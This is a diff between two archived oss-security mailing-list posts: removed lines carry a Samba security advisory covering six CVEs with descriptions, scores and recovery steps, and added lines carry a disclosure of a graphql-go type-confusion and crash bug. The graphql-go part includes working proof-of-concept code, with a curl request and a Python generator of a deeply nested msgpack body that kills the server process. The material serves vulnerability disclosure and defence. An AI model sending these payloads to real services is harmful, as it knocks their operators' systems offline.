@@ -1,556 +1,317 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/07/29/2
-Message-ID: <64f9e114-0c98-4308-b2af-013dcd7823d2@catalyst.net.nz>
-Date: Wed, 29 Jul 2026 13:04:47 +1200
-From: Douglas Bagnall <douglas.bagnall@...alyst.net.nz>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/29/2
+Message-ID: <CAK=gNzqbRt+-oQSz1=sto4V5rA7tZTpmW_KSVVxQGi-EfH_7Ag@mail.gmail.com>
+Date: Sat, 29 Aug 2026 17:36:08 +0200
+From: William Carrier <0x6675636b736f6369617479@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Fwd: Heads-up: Upcoming important Samba security releases on 2026-07-28
+Subject: Re: graphql-go/graphql <= 0.8.1: improper scalar input-type validation -> type confusion and unrecoverable stack-overflow DoS
 Content-Type: text/plain; charset=utf-8
 
-On 24/07/2026 09:38, Douglas Bagnall wrote:
-> There will be a security release for Samba on Tuesday.
-
-As below. I have forwarded the Samba mailing list announcement, then 
-below that I have pasted non-repetitive details from the various links. 
-In some cases there is more to be found on the Samba bugzilla.
-
-Douglas
-
-
-
-Release Announcements
----------------------
-
-This is a security release in order to address the following defects:
-
-o CVE-2026-6949:   TSIG packet with name compression can crash DNS
-
-            Incorrect size calculations when a TSIG record
-            contains compressed names can lead to a large
-            out-of-bounds write causing the server to crash.
-
-   https://www.samba.org/samba/security/CVE-2026-6949.html
-
-
-o CVE-2026-58216:  An authenticated user could possibly crash a KDC
-                    process
-
-            A kpasswd packet that contains malformed ASN.1 might
-            cause the server to access 6 bytes of unallocated
-            memory. This memory is not exposed to the user, but
-            in some circumstances the server could crash.
-
-   https://www.samba.org/samba/security/CVE-2026-58216.html
-
-
-o CVE-2026-58218:  DNS signing DoS via TKEY name cache exhaustion
-
-            An unauthenticated user can repeatedly register names
-            TKEY names, which floods a cache causing legitimate
-            TKEYs to be expunged. This can practically block the
-            use DNS TSIG signing.
-
-   https://www.samba.org/samba/security/CVE-2026-58218.html
-
-
-o CVE-2026-58221:  Samba AD authenticated LDAP access domain takeover
-
-            Samba AD low-privilege authenticated LDAP access
-            allows modifications to internal LDB special DNs,
-            which permits a domain takeover.
-
-   https://www.samba.org/samba/security/CVE-2026-58221.html
-
-
-o CVE-2026-58222:  Samba AD LDAP Compare filter injection and
-                    trusted-request confusion disclose protected
-                    attributes
-
-            An ordinary authenticated domain user can bypass
-            access checks and query confidential Active Directory
-            attributes (such as KDS root keys) via LDAP Compare
-            requests. Due to a filter injection flaw and trusted
-            execution context, the LDAP Compare operation can be
-            turned into a protected-attribute disclosure oracle.
-
-   https://www.samba.org/samba/security/CVE-2026-58222.html
-
-
-o CVE-2026-58224:  The CTDB protocol has bounds checking issues
-
-            CTDB fails to do integrity checking of received
-            packets.  This includes failure to check field
-            lengths against packet lengths when unmarshalling
-            packets.
-
-   https://www.samba.org/samba/security/CVE-2026-58224.html
-
-
-Changes
--------
-
-o  Douglas Bagnall <douglas.bagnall@...alyst.net.nz>
-    * BUG 16087: CVE-2026-58216
-
-o  Volker Lendecke <vl@...ba.org>
-    * BUG 16115: CVE-2026-58218
-
-o  Stefan Metzmacher <metze@...ba.org>
-    * BUG 16083: CVE-2026-6949
-    * BUG 16147: CVE-2026-58221
-    * BUG 16148: CVE-2026-58222
-
-o  Martin Schwenke <mschwenke@....com>
-    * BUG 16085: CVE-2026-58224
-
-
-#######################################
-Reporting bugs & Development Discussion
-#######################################
-
-Please discuss this release on the samba-technical mailing list or by
-joining the #samba-technical:matrix.org matrix room, or
-#samba-technical IRC channel on irc.libera.chat.
-
-If you do report problems then please try to send high quality
-feedback. If you don't provide vital information to help us track down
-the problem then you will probably be ignored.  All bug reports should
-be filed under the Samba 4.1 and newer product in the project's Bugzilla
-database (https://bugzilla.samba.org/).
-
-
-======================================================================
-== Our Code, Our Bugs, Our Responsibility.
-== The Samba Team
-======================================================================
-
-
-* Individual bug advisories follow.
-
-
-===========================================================
-== Subject:     TSIG packet with name compression can crash DNS
-==
-== CVE ID#:     CVE-2026-6949
-==
-== Versions:    All versions since 4.0
-==
-
-== Summary:     Incorrect size calculations when a TSIG record
-                 contains compressed names can lead to a large
-		out-of-bounds write causing the server to crash.
-
-===========================================================
-
-===========
-Description
-===========
-
-To calculate the size of a DNS packet region signed by a TSIG record,
-Samba's internal DNS server subtracted the presumed size of the TSIG
-record. In cases where the record used name compression, an incorrect
-calculation could be made. Usually this manifests as a signing
-failure, but in extreme cases the TSIG record was assumed to be bigger
-than the entire packet, wrapping the presumed size of the signed
-portion to a very large integer. Efforts to copy this portion
-inevitably hit unallocated memory.
-
-==================
-CVSSv3 calculation
-==================
-
-CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (7.5)
-
-==========
-Workaround
-==========
-
-The BIND9 DLZ is not affected.
-
-=======
-Credits
-=======
-
-Originally reported by Arjun Basnet of Securin Labs, with further
-analysis by Douglas Bagnall of Catalyst and the Samba team.
-
-Also reported by Andrew Tridgell of the Samba Team.
-
-Patches provided by Stefan Metzmacher of the Samba team.
-
-
-===========================================================
-== Subject:     An authenticated user could possibly crash a KDC process
-==
-== CVE ID#:     CVE-2026-58216
-==
-== Versions:    All versions since 4.0
-==
-
-== Summary:     A kpasswd packet that contains malformed ASN.1 might cause
-                 the server to access 6 bytes of unallocated memory. 
-This memory
-		is not exposed to the user, but in some circumstances the server
-		could crash.
-
-===========================================================
-
-===========
-Description
-===========
-
-A miscalculation means an ASN.1 structure used in a Kerberos password
-change is assumed to be six bytes bigger than it is. This does not
-affect ordinary packets (the ASN.1 itself contains the correct size),
-but a crafted ANS1 packet could force up to six unallocated bytes to
-be read. The usual outcome of this will be a decryption failure and an
-error message, but it could make the server process crash.
-
-==================
-CVSSv3 calculation
-==================
-
-CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H  5.3
-
-==========
-Workaround
-==========
-
-Setting the smb.conf option "kpasswd port = 0" will disable the
-kpasswd service.
-
-The attack seems quite unreliable in practice, so an attacker might be
-observed making thousands of kpasswd attempts before succeeding.
-Rate-limiting traffic to the kpasswd port might be useful.
-
-=======
-Credits
-=======
-
-Originally reported by Tristan Madani (@TristanInSec), Talence Security.
-
-Patch provided by Douglas Bagnall of the Samba team.
-
-==========================================================
-== Our Code, Our Bugs, Our Responsibility.
-== The Samba Team
-==========================================================
-
-
-===========================================================
-== Subject:     DNS signing DoS via TKEY name cache exhaustion
-==
-== CVE ID#:     CVE-2025-58218
-==
-== Versions:    All versions since 4.0
-==
-
-== Summary:     An unauthenticated user can repeatedly register names
-                 TKEY names, which floods a cache causing legitimate
-		TKEYs to be expunged. This can practically block the use
-		DNS TSIG signing.
-
-===========================================================
-
-===========
-Description
-===========
-
-Only authenticated users are supposed to be able to use TKEY DNS
-records to register shared secrets for use with TSIG queries. Samba
-has been rejecting unauthenticated queries, but only after registering
-the TKEY names in a cache used to filter out TSIG requests.
-
-By flooding the DNS server with TKEY requests with arbitrary names,
-an attacker can block legitimate TSIG use.
-
-This bug exacerbates CVE-2026-6949 (crafted TSIG packet can crash the
-DNS server) because it means the attacker there does not need to be
-authenticated.
-
-
-==================
-CVSSv3 calculation
-==================
-
-CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (5.3)
-
-==========
-Workaround
-==========
-
-The BIND9 DLZ is not affected.
-
-=======
-Credits
-=======
-
-Originally reported by Andrew Tridgell of the Samba Team.
-
-Also reported by Tristan Madani of Talence Security.
-
-Patches provided by Volker Lendecke of the Samba team.
-
-
-
-
-==================================================================
-== Subject:     Samba AD authenticated LDAP access domain takeover
-==
-== CVE ID#:     CVE-2026-58221
-==
-== Versions:    Samba AD DC versions 4.0.0 and later
-==
-== Summary:     Samba AD low-privilege authenticated LDAP access
-==              allows modifications to internal LDB special DNs,
-==              which permits a domain takeover.
-==================================================================
-
-===========
-Description
-===========
-
-Samba AD stores internal database configuration in LDB special records
-such as @MODULES and @PARTITION. These records are not directory
-objects and should never be writable by a normal LDAP client.
-
-An authenticated low-privilege domain user can nevertheless modify
-them through LDAP. The LDAP request is correctly marked as untrusted,
-but `rootdse_filter_operations()` only rejects anonymous callers. The
-request then reaches the DSDB ACL module, which intentionally skips
-ACL processing for special DNs because it assumes only trusted
-internal callers can reach them.
-
-This lets an ordinary user replace the DSDB module chain loaded for
-new LDAP connections. By omitting only acl and aclread, the attacker
-gets a fully functional LDAP connection without directory ACL
-enforcement and can add themselves to protected administrator groups.
-
-High-signal indicators:
-
-- A recent modification timestamp of the main sam.ldb
-   most likely: /var/lib/samba/private/sam.ldb
-- LDAP operations targeting DNs beginning with `@`;
-- `@...ULES/@...T` differing from `samba_dsdb`;
-- unexpected `@...TITION/modules` values on a standard provision;
-- low-privilege accounts added to `Domain Admins`, `Enterprise Admins`, or
-   `Builtin Administrators`;
-- Samba logs showing unusual module-load failures or module-stack changes.
-
-If exploitation is suspected:
-
-1. Stop Samba before editing internal LDB records offline.
-2. Confirm `@...ULES/@...T` is exactly `samba_dsdb`.
-3. Remove unexpected `@...TITION/modules` values offline if present.
-4. Remove unauthorized protected-group memberships.
-5. Audit privileged group, ACL, GPO/SYSVOL, service-account, and replication
-    changes made during the compromise window.
-6. Rotate credentials according to the site's AD recovery plan, including
-    KRBTGT where appropriate.
-
-==================
-CVSSv3 calculation
-==================
-
-CVSS:AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8)
-
-==========
-Workaround
-==========
-
-There are no known workarounds for this vulnerability. Administrators are
-advised to apply the security updates or patches as soon as possible.
-
-In order to audit related changes and find the account that tries
-the modifications, you can setup one or more log levels of:
-dsdb_audit, dsdb_json_audit, dsdb_group_audit, dsdb_group_json_audit
-See 'man smb.conf' for setup details.
-
-=======
-Credits
-=======
-
-Originally reported by OpenAI Security Research.
-
-Patches provided by Stefan Metzmacher of the SerNet and the Samba team.
-
-
-==========================================================================
-== Subject:     Samba AD LDAP Compare filter injection and trusted-request
-==              confusion disclose protected attributes
-==
-== CVE ID#:     CVE-2026-58222
-==
-== Versions:    Samba AD DC versions 4.0.0 and later
-==
-== Summary:     An ordinary authenticated domain user can bypass access
-==              checks and query confidential Active Directory attributes
-==              (such as KDS root keys) via LDAP Compare requests. Due to
-==              a filter injection flaw and trusted execution context, the
-==              LDAP Compare operation can be turned into a
-==              protected-attribute disclosure oracle.
-==========================================================================
-
-===========
-Description
-===========
-
-Samba's LDAP CompareRequest path contains two independent security
-flaws that can be combined by an authenticated attacker to construct a
-reliable oracle for protected (confidential) Active Directory
-attributes.
-
-1. Filter Injection Flaw
-
-When processing an LDAP Compare request, Samba constructs a textual
-LDB filter by directly formatting the user-provided attribute name and
-assertion value into a search filter string using talloc_asprintf():
-
-     filter = talloc_asprintf(local_ctx, "(%s=%*s)", req->attribute,
-                              (int)req->value.length, req->value.data);
-
-This formulation is unsafe because:
-- The attribute name is not validated as a valid LDAP AttributeDescription.
-- The assertion value is not escaped.
-- The field format (%*s) does not properly handle binary or BER-encoded 
-bytes.
-
-By providing an attribute name containing filter operators (for
-example, appending ">=" to the attribute name), an attacker can coerce
-Samba into evaluating a comparison operator other than equality.
-
-2. Trusted Search Context Flaw
-Samba evaluates the generated filter using an internal local LDB
-search request without marking it as untrusted. Normal LDAP search
-requests enforce access controls by marking requests from unprivileged
-connections as untrusted. The ACL read module uses this marker to
-determine whether it must enforce visibility checks. Because Compare
-requests do not mark the database search as untrusted, they are
-evaluated with trusted system-level visibility, bypassing standard ACL
-checks for confidential attributes.
-
-Combining these two flaws, an ordinary authenticated domain user can
-issue ordered true/false Compare queries (e.g. using inequality
-operators like ">=") to binary-search and reconstruct binary values of
-confidential attributes that are normally redacted from LDAP Search
-results.
-
-A key target for this attack is the msKds-RootKeyData attribute, which
-contains the root secret for the Group Key Distribution Service
-(GKDI). On Samba AD DC installations supporting Group Managed Service
-Accounts (gMSAs) (Samba 4.21.0 and later), an attacker can extract
-this key and derive the passwords of gMSAs offline. If a privileged
-gMSA exists, this allows full domain compromise.
-
-==================
-CVSSv3 calculation
-==================
-
-CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8)
-
-Severity is High for generic protected-attribute disclosure, and
-Critical when disclosed KDS roots are used to compromise privileged
-gMSAs.
-
-==========
-Workaround
-==========
-
-There are no known workarounds for this vulnerability. Administrators
-are advised to apply the security updates or patches as soon as
-possible.
-
-=======
-Credits
-=======
-
-Originally reported by OpenAI Security Research.
-
-Underlying bugs also reported by Andrew Tridgell of the Samba Team and
-Tristan Madani of Talence Security.
-
-Patches provided by Stefan Metzmacher of the SerNet and the Samba
-team.
-
-
-
-===========================================================
-== Subject:     The CTDB protocol has bounds checking issues
-==
-== CVE ID#:     CVE-2026-58224
-==
-== Versions:    All versions since 4.2
-==
-
-== Summary:     CTDB fails to do integrity checking of received
-                 packets.  This includes failure to check field lengths
-                 against packet lengths when unmarshalling packets.
-
-===========================================================
-
-===========
-Description
-===========
-
-CTDB fails to do a number of integrity checks on received packets.
-This includes:
-
-* checking of field lengths against packet lengths when unmarshalling
-   packets;
-* edge-case checking of string NUL-termination; and
-* sanity checking of overall packet lengths.
-
-This can result in denial of service (DoS) (due to crash or out-of
-memory) and possible limited disclosure of adjacent memory
-allocations.
-
-Most of the issues are in the protocol handling for the CTDB private
-network. Some are in handling of the CTDB event protocol, used on a
-local Unix domain socket.
-
-The impact is mitigated by documented protections that should be in
-place on the CTDB private network:
-
-   It is strongly recommended that the private addresses are configured
-   on a private network that is separate from client networks.  This is
-   because the CTDB protocol is both unauthenticated and unencrypted.
-   [...]
-
-Overall sanity checking of packet lengths to avoid out-of-memory DoS
-is not being addressed. No size limit is currently placed on packets
-sent by CTDB, so implementing an arbitrary restriction on the size of
-received packets could result in the rejection of valid packets.
-
-Part of the solution to all of these issues is strengthening the
-documentation about securing the private network.
-
-
-==================
-CVSSv3 calculation
-==================
-
-CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H 7.1
-
-==========
-Workaround
-==========
-
-Secure the CTDB private network, as documented.
-
-=======
-Credits
-=======
-
-The top-level CTDB protocol issues were originally reported by Tristan
-Madani of Talence Security.
-
-Out-of-memory DoS issues, along with issues in the event protocol and
-the control part of the main protocol were reported by Andrew
-Tridgell.
-
-Further issues were discovered by Martin Schwenke of the Samba team
-while fixing the above issues and auditing other code paths.
-
-Patches provided by Martin Schwenke of the Samba team.
-
+Follow-up on *CVE-2026-80051*. The CVE record was published with Attack
+Vector AV:L. That is incorrect: the correct Attack Vector is AV:N. Nothing
+else changes. The transport gating I described is still there, but it
+belongs to Attack Requirements, not to Attack Vector.
+
+There are two consequences of the one root cause (coerceString/coerceBool
+accepting a wrong-typed value), and BOTH are network-origin:
+
+  1. Type confusion / improper input validation, unconditional, and
+reachable over the most common transport (HTTP + JSON). No special
+condition at all.
+  2. Process-terminating crash (fmt recursion -> "fatal error: stack
+overflow"), reachable when variables arrive through a deserialization path
+that does not cap nesting depth. Go's encoding/json AND jsoniter both cap
+at depth 10000, whereas the crash needs ~600000; so over vanilla JSON this
+half is rejected before it reaches the library. That single fact is exactly
+what AT:P already encode. It does not turn a network-delivered payload into
+"local access" depth-uncapped transports (msgpack, CBOR, gRPC/protobuf,
+message-queue payloads, or variables built programmatically from network
+input) are all remote.
+
+In short: the gate is a requirements condition, not a vector one.
+
+Corrected vectors:
+  CVSS 4.0:  *AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N*
+
+Both PoCs below run against the published v0.8.1 (Go module proxy) and
+speak only over the network.
+
+--------------------------------------------------------------------
+PoC A — type confusion over standard HTTP + JSON
+--------------------------------------------------------------------
+Server (a normal graphql-go HTTP endpoint):
+
+    package main
+
+    import (
+        "encoding/json"; "fmt"; "io"; "log"; "net/http"
+        "github.com/graphql-go/graphql"
+    )
+    func main() {
+        schema, _ := graphql.NewSchema(graphql.SchemaConfig{
+            Query: graphql.NewObject(graphql.ObjectConfig{Name: "Query",
+                Fields: graphql.Fields{"echo": &graphql.Field{
+                    Type: graphql.String,
+                    Args: graphql.FieldConfigArgument{"n":
+&graphql.ArgumentConfig{Type: graphql.String}},
+                    Resolve: func(p graphql.ResolveParams) (interface{},
+error) {
+                        return fmt.Sprintf("resolver got Go type=%T",
+p.Args["n"]), nil
+                    }}}})})
+        http.HandleFunc("/graphql", func(w http.ResponseWriter, r
+*http.Request) {
+            b, _ := io.ReadAll(r.Body)
+            var q struct{ Query string `json:"query"`; Variables
+map[string]interface{} `json:"variables"` }
+            if err := json.Unmarshal(b, &q); err != nil {
+w.WriteHeader(400); io.WriteString(w, err.Error()); return }
+            json.NewEncoder(w).Encode(graphql.Do(graphql.Params{Schema:
+schema, RequestString: q.Query, VariableValues: q.Variables}))
+        })
+        log.Fatal(http.ListenAndServe("127.0.0.1:18104", nil))
+    }
+
+Attack; send a JSON OBJECT for a variable declared String:
+
+    curl -s -X POST http://127.0.0.1:18104/graphql -H 'Content-Type:
+application/json' \
+      -d '{"query":"query($n: String){ echo(n:$n)
+}","variables":{"n":{"admin":true,"x":[1,2,3]}}}'
+
+Result: {"data":{"echo":"resolver got Go type=string"}}, no "errors". The
+spec (Oct 2021, sec. 3.5) says String "must raise a request error" for a
+non-string input; instead the wrong type is accepted and coerced. A remote
+request defeated the type check: network vector.
+
+--------------------------------------------------------------------
+PoC B — process crash over the network via a depth-uncapped transport
+--------------------------------------------------------------------
+Same defect, availability impact. Add a msgpack endpoint to the server
+above (msgpack, unlike JSON, does not cap nesting depth as used by
+RPC/queue/service-mesh-fed GraphQL gateways):
+
+    // import: msgpack "github.com/vmihailenco/msgpack/v5"
+    http.HandleFunc("/graphql-msgpack", func(w http.ResponseWriter, r
+*http.Request) {
+        b, _ := io.ReadAll(r.Body)
+        var q struct{ Query string `msgpack:"query"`; Variables
+map[string]interface{} `msgpack:"variables"` }
+        if err := msgpack.Unmarshal(b, &q); err != nil {
+w.WriteHeader(400); io.WriteString(w, err.Error()); return }
+        graphql.Do(graphql.Params{Schema: schema, RequestString: q.Query,
+VariableValues: q.Variables}) // crashes
+    })
+
+Attack (remote) — emit a deep msgpack envelope and POST it:
+
+    python3 - 700000 > body.bin <<'PY'
+    import sys; d=int(sys.argv[1]); o=bytearray()
+    o+=b'\x82\xa5query'; q=b'query($n: String){ echo(n:$n) }'
+    o+=b'\xd9'+bytes([len(q)])+q
+    o+=b'\xa9variables\x81\xa1n'+(b'\x81\xa1n')*(d-1)+b'\xa4leaf'
+    sys.stdout.buffer.write(o)
+    PY
+    curl -s -X POST http://127.0.0.1:18104/graphql-msgpack \
+      -H 'Content-Type: application/msgpack' --data-binary @body.bin
+
+Result: the server process dies mid-request (connection dropped); its
+stderr shows
+
+    fatal error: stack overflow
+    ...
+    fmt.(*pp).handleMethods(...)
+    fmt.(*pp).printValue(...)      <- coerceString's fmt.Sprintf("%v",
+value), unbounded
+
+A single unauthenticated network request terminates the process; it is a
+runtime fatal error, not a panic, so recover() cannot save it.
+
+Regards,
+WC
+
+On Tue, Aug 25, 2026 at 10:02 AM First name Last name <
+0x6675636b736f6369617479@...il.com> wrote:
+
+> Hello,
+>
+> This reports a security defect in github.com/graphql-go/graphql (GraphQL
+> for Go), affecting all released versions up to and including the latest,
+> v0.8.1 (released 2023-04-10). No fixed version exists.
+>
+> The repository has no private security-reporting channel: GitHub private
+> vulnerability reporting is disabled and there is no SECURITY.md. This is
+> therefore disclosed publicly. A CVE ID has been requested from MITRE (CNA
+> of Last Resort) and is pending.
+>
+> == Summary ==
+>
+> graphql-go/graphql does not validate that a scalar variable value matches
+> its declared type. The built-in coerceString and coerceBool functions
+> (scalars.go) accept input whose type does not match the declared String,
+> ID, or Boolean scalar instead of raising the request error the GraphQL
+> specification mandates and coerce it anyway. One root cause, two
+> consequences:
+>
+>   1. (primary) Unrecoverable denial of service. For String/ID, a
+> non-string value is passed to fmt.Sprintf("%v", value); a deeply nested
+> value supplied as a String/ID/Boolean variable drives unbounded recursion
+> in the fmt package, producing a Go "fatal error: stack overflow" that
+> terminates the process and cannot be caught by recover().
+>
+>   2. (secondary) Improper input validation / type confusion. A wrong-typed
+> value (e.g. a JSON object where String is declared) is accepted with no
+> error and the resolver receives its %v string rendering, contrary to the
+> spec.
+>
+> == Affected ==
+>
+>   Product:  github.com/graphql-go/graphql
+>   Versions: all <= v0.8.1 (latest release); no fix available
+>   Verified: reproduced against v0.8.1 fetched from the Go module proxy;
+> scalars.go is byte-identical between v0.8.1 and current master.
+>
+> == Details ==
+>
+> coerceString (scalars.go, v0.8.1 lines 307-315):
+>
+>     func coerceString(value interface{}) interface{} {
+>         if v, ok := value.(*string); ok {
+>             if v == nil {
+>                 return nil
+>             }
+>             return *v
+>         }
+>         return fmt.Sprintf("%v", value)   // accepts ANY type
+>     }
+>
+> The scalar input-validation gate (values.go) treats a value as valid when
+> the scalar's ParseValue returns a non-nullish result. For String,
+> ParseValue is coerceString, which returns a non-nil string for every
+> possible Go value (maps, slices, structs) via the fmt.Sprintf fallback. So
+> validation never rejects a wrong type. ID delegates to coerceString and
+> inherits this. coerceBool has the analogous defect: unhandled types fall
+> through to "return false" (a valid Boolean), and strings are
+> JS-truthy-coerced rather than rejected.
+>
+> For the crash: fmt.Sprintf("%v", value) on a deeply nested
+> map[string]interface{} recurses one fmt-internal frame per level
+> (fmt.(*pp).printValue / handleMethods). Go's goroutine stack has a hard 1
+> GB ceiling, therefore, exceeding it is a runtime fatal error, not a panic,
+> and cannot be recovered.
+>
+> == Specification ==
+>
+> This violates explicit mandatory ("must") language in the GraphQL
+> specification (October 2021 edition, section 3.5, scalar Input Coercion):
+>
+>   String:  "only valid Unicode string input values are accepted. All other
+> input values must raise a request error indicating an incorrect
+>            type."
+>   Boolean: "only boolean input values are accepted. All other input values
+> must raise a request error indicating an incorrect type."
+>
+> coerceInt and coerceFloat in the same file implement the equivalent rule
+> correctly (they type-switch and return nil for other types), which shows
+> the String/Boolean/ID behavior is an inconsistency, not an intended design.
+>
+> == Impact and reachability ==
+>
+> The primary impact is the process-terminating crash. Its reachability is
+> gated by how variables reach the library: the most common transport, an
+> HTTP JSON body decoded by Go's standard encoding/json, is NOT vulnerable
+> and not marginally. encoding/json caps decoding at nesting depth 10000,
+> whereas the crash requires roughly 600000 levels (measured: survives
+> 10k/100k/300k, crashes near 600k), a ~60x margin. Realistic exposure is
+> therefore via a non-JSON transport (gRPC/protobuf, MessagePack,
+> message-queue payloads), variables constructed programmatically rather than
+> decoded from a single JSON body, or a JSON decoder configured without a
+> depth cap.
+>
+> The type-confusion half is unconditional but weak as a standalone impact:
+> the resolver receives a correctly-typed Go string (the %v rendering), and a
+> client could already supply any string to a String argument so the defect
+> is the failure to reject the wrong type, not any new injectable content.
+> Its concrete risk depends on downstream application code that trusts the
+> declared type.
+>
+> For reference, this library already carries CVE-2022-37315 (CWE-674) for
+> an analogous uncontrolled-recursion crash in its SDL type-definition
+> parser, a less attacker-facing vector than query variables.
+>
+> == Proof of concept ==
+>
+> Both parts use only the library's public API and reproduce against v0.8.1.
+>
+> Part 1 -- type-confusion (no crash):
+>
+>     package main
+>
+>     import (
+>         "fmt"
+>         "github.com/graphql-go/graphql"
+>     )
+>
+>     func main() {
+>         queryType := graphql.NewObject(graphql.ObjectConfig{
+>             Name: "Query",
+>             Fields: graphql.Fields{
+>                 "echo": &graphql.Field{
+>                     Type: graphql.String,
+>                     Args: graphql.FieldConfigArgument{
+>                         "n": &graphql.ArgumentConfig{Type: graphql.String},
+>                     },
+>                     Resolve: func(p graphql.ResolveParams) (interface{},
+> error) {
+>                         return fmt.Sprintf("%T / %v", p.Args["n"],
+> p.Args["n"]), nil
+>                     },
+>                 },
+>             },
+>         })
+>         schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query:
+> queryType})
+>
+>         r := graphql.Do(graphql.Params{
+>             Schema:        schema,
+>             RequestString: `query($n: String){ echo(n:$n) }`,
+>             VariableValues: map[string]interface{}{
+>                 "n": map[string]interface{}{"admin": true, "x":
+> []interface{}{1, 2, 3}},
+>             },
+>         })
+>         // Observed: r.Errors is empty (spec requires a request error).
+>         // Resolver received: "string / map[admin:true x:[1 2 3]]"
+>         fmt.Printf("errors=%v data=%v\n", r.Errors, r.Data)
+>     }
+>
+> Part 2 -- unrecoverable crash (same schema):
+>
+>     depth := 1000000
+>     var v interface{} = "leaf"
+>     for i := 0; i < depth; i++ {
+>         v = map[string]interface{}{"n": v}
+>     }
+>     graphql.Do(graphql.Params{
+>         Schema:        schema,
+>         RequestString: `query($n: String){ echo(n:$n) }`,
+>         VariableValues: map[string]interface{}{"n": v},
+>     })
+>     // runtime: goroutine stack exceeds 1000000000-byte limit
+>     // fatal error: stack overflow
+>     //   ... fmt.(*pp).printValue ... fmt.(*pp).handleMethods ...
+>
+> == Remediation ==
+>
+> coerceString should accept only string/*string (ID additionally int/float
+> per the spec's ID coercion rule) and return nil for other types; coerceBool
+> should accept only bool/*bool and return nil otherwise, with no string
+> coercion. Returning nil makes the input-validation gate raise the
+> spec-mandated request error, which closes BOTH consequences -- a
+> wrong-typed value never reaches fmt.Sprintf.
+>
+> == Credit ==
+>
+>   William Carrier, independent security researcher.
+>
 
